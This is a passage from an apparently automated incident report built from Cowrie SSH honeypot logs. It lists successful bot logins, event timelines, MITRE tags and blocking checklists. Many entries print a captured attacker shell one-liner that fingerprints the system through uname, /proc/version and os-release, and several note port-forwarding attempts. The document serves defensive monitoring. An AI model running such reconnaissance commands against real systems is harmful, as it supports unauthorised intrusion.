- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7964bdf489ef

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:33 |
| **Last Seen** | 2026-08-01 09:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:33:20` | `cowrie.session.connect` |
| `2026-08-01 09:33:20` | `cowrie.client.version` |
| `2026-08-01 09:33:20` | `cowrie.client.kex` |
| `2026-08-01 09:33:25` | `cowrie.login.success` |
| `2026-08-01 09:33:27` | `cowrie.session.params` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:27` | `cowrie.command.success` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:27` | `cowrie.command.input` |
| `2026-08-01 09:33:28` | `cowrie.log.closed` |
| `2026-08-01 09:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30fedb360f6d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:34 |
| **Last Seen** | 2026-08-01 09:34 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:34:31` | `cowrie.session.connect` |
| `2026-08-01 09:34:32` | `cowrie.client.version` |
| `2026-08-01 09:34:32` | `cowrie.client.kex` |
| `2026-08-01 09:34:37` | `cowrie.login.success` |
| `2026-08-01 09:34:40` | `cowrie.session.params` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:40` | `cowrie.command.success` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:40` | `cowrie.command.input` |
| `2026-08-01 09:34:41` | `cowrie.log.closed` |
| `2026-08-01 09:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4269d75cb911

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:35 |
| **Last Seen** | 2026-08-01 09:35 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:35:46` | `cowrie.session.connect` |
| `2026-08-01 09:35:47` | `cowrie.client.version` |
| `2026-08-01 09:35:47` | `cowrie.client.kex` |
| `2026-08-01 09:35:51` | `cowrie.login.success` |
| `2026-08-01 09:35:54` | `cowrie.session.params` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:54` | `cowrie.command.success` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:54` | `cowrie.command.input` |
| `2026-08-01 09:35:55` | `cowrie.log.closed` |
| `2026-08-01 09:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107910beece0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:37 |
| **Last Seen** | 2026-08-01 09:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:37:01` | `cowrie.session.connect` |
| `2026-08-01 09:37:02` | `cowrie.client.version` |
| `2026-08-01 09:37:02` | `cowrie.client.kex` |
| `2026-08-01 09:37:06` | `cowrie.login.success` |
| `2026-08-01 09:37:09` | `cowrie.session.params` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:09` | `cowrie.command.success` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:09` | `cowrie.command.input` |
| `2026-08-01 09:37:10` | `cowrie.log.closed` |
| `2026-08-01 09:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-846a677c4127

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:38 |
| **Last Seen** | 2026-08-01 09:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:38:17` | `cowrie.session.connect` |
| `2026-08-01 09:38:18` | `cowrie.client.version` |
| `2026-08-01 09:38:18` | `cowrie.client.kex` |
| `2026-08-01 09:38:22` | `cowrie.login.success` |
| `2026-08-01 09:38:25` | `cowrie.session.params` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:25` | `cowrie.command.success` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:25` | `cowrie.command.input` |
| `2026-08-01 09:38:26` | `cowrie.log.closed` |
| `2026-08-01 09:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a3d37ffc55

| Field | Detail |
|---|---|
| **Source IP** | `37.238.45[.]202` |
| **First Seen** | 2026-08-01 09:39 |
| **Last Seen** | 2026-08-01 09:39 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:39:01` | `cowrie.session.connect` |
| `2026-08-01 09:39:03` | `cowrie.client.version` |
| `2026-08-01 09:39:03` | `cowrie.client.kex` |
| `2026-08-01 09:39:11` | `cowrie.login.success` |
| `2026-08-01 09:39:14` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:39:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.238.45[.]202` to AbuseIPDB if not already reported
- [ ] Block `37.238.45[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cd89b4e70dd

| Field | Detail |
|---|---|
| **Source IP** | `65.20.211[.]96` |
| **First Seen** | 2026-08-01 09:39 |
| **Last Seen** | 2026-08-01 09:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:39:23` | `cowrie.session.connect` |
| `2026-08-01 09:39:23` | `cowrie.client.version` |
| `2026-08-01 09:39:23` | `cowrie.client.kex` |
| `2026-08-01 09:39:25` | `cowrie.login.success` |
| `2026-08-01 09:39:25` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.211[.]96` to AbuseIPDB if not already reported
- [ ] Block `65.20.211[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad7f8e1b0a92

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:39 |
| **Last Seen** | 2026-08-01 09:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:39:32` | `cowrie.session.connect` |
| `2026-08-01 09:39:33` | `cowrie.client.version` |
| `2026-08-01 09:39:33` | `cowrie.client.kex` |
| `2026-08-01 09:39:37` | `cowrie.login.success` |
| `2026-08-01 09:39:40` | `cowrie.session.params` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:40` | `cowrie.command.success` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:40` | `cowrie.command.input` |
| `2026-08-01 09:39:41` | `cowrie.log.closed` |
| `2026-08-01 09:39:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-841c6aafcf98

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:42 |
| **Last Seen** | 2026-08-01 09:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:42:01` | `cowrie.session.connect` |
| `2026-08-01 09:42:02` | `cowrie.client.version` |
| `2026-08-01 09:42:02` | `cowrie.client.kex` |
| `2026-08-01 09:42:06` | `cowrie.login.success` |
| `2026-08-01 09:42:08` | `cowrie.session.params` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:08` | `cowrie.command.success` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:08` | `cowrie.command.input` |
| `2026-08-01 09:42:10` | `cowrie.log.closed` |
| `2026-08-01 09:42:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa4addea48be

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 09:42 |
| **Last Seen** | 2026-08-01 09:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:42:50` | `cowrie.session.connect` |
| `2026-08-01 09:42:50` | `cowrie.client.version` |
| `2026-08-01 09:42:50` | `cowrie.client.kex` |
| `2026-08-01 09:42:51` | `cowrie.login.success` |
| `2026-08-01 09:42:52` | `cowrie.session.params` |
| `2026-08-01 09:42:52` | `cowrie.command.input` |
| `2026-08-01 09:42:52` | `cowrie.log.closed` |
| `2026-08-01 09:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d90fcd4e36e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:43 |
| **Last Seen** | 2026-08-01 09:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:43:17` | `cowrie.session.connect` |
| `2026-08-01 09:43:18` | `cowrie.client.version` |
| `2026-08-01 09:43:18` | `cowrie.client.kex` |
| `2026-08-01 09:43:21` | `cowrie.login.success` |
| `2026-08-01 09:43:24` | `cowrie.session.params` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:24` | `cowrie.command.success` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:24` | `cowrie.command.input` |
| `2026-08-01 09:43:25` | `cowrie.log.closed` |
| `2026-08-01 09:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0117f7e8c181

| Field | Detail |
|---|---|
| **Source IP** | `112.194.142[.]167` |
| **First Seen** | 2026-08-01 09:44 |
| **Last Seen** | 2026-08-01 09:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:44:30` | `cowrie.session.connect` |
| `2026-08-01 09:44:31` | `cowrie.client.version` |
| `2026-08-01 09:44:31` | `cowrie.client.kex` |
| `2026-08-01 09:44:34` | `cowrie.login.success` |
| `2026-08-01 09:44:34` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:44:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.194.142[.]167` to AbuseIPDB if not already reported
- [ ] Block `112.194.142[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12a08f9b2f07

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-01 09:44 |
| **Last Seen** | 2026-08-01 09:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:44:30` | `cowrie.session.connect` |
| `2026-08-01 09:44:31` | `cowrie.client.version` |
| `2026-08-01 09:44:31` | `cowrie.client.kex` |
| `2026-08-01 09:44:34` | `cowrie.login.success` |
| `2026-08-01 09:44:37` | `cowrie.session.params` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:37` | `cowrie.command.success` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:37` | `cowrie.command.input` |
| `2026-08-01 09:44:38` | `cowrie.log.closed` |
| `2026-08-01 09:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d427db81a2

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-01 09:44 |
| **Last Seen** | 2026-08-01 09:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:44:37` | `cowrie.session.connect` |
| `2026-08-01 09:44:37` | `cowrie.client.version` |
| `2026-08-01 09:44:37` | `cowrie.client.kex` |
| `2026-08-01 09:44:38` | `cowrie.login.success` |
| `2026-08-01 09:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c11a76cfbf

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-01 09:44 |
| **Last Seen** | 2026-08-01 09:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:44:37` | `cowrie.session.connect` |
| `2026-08-01 09:44:37` | `cowrie.client.version` |
| `2026-08-01 09:44:37` | `cowrie.client.kex` |
| `2026-08-01 09:44:38` | `cowrie.login.success` |
| `2026-08-01 09:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd1ff25f865

| Field | Detail |
|---|---|
| **Source IP** | `112.168.1[.]182` |
| **First Seen** | 2026-08-01 09:44 |
| **Last Seen** | 2026-08-01 09:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 09:44:44` | `cowrie.session.connect` |
| `2026-08-01 09:44:45` | `cowrie.client.version` |
| `2026-08-01 09:44:45` | `cowrie.client.kex` |
| `2026-08-01 09:44:47` | `cowrie.login.success` |
| `2026-08-01 09:44:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 09:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.1[.]182` to AbuseIPDB if not already reported
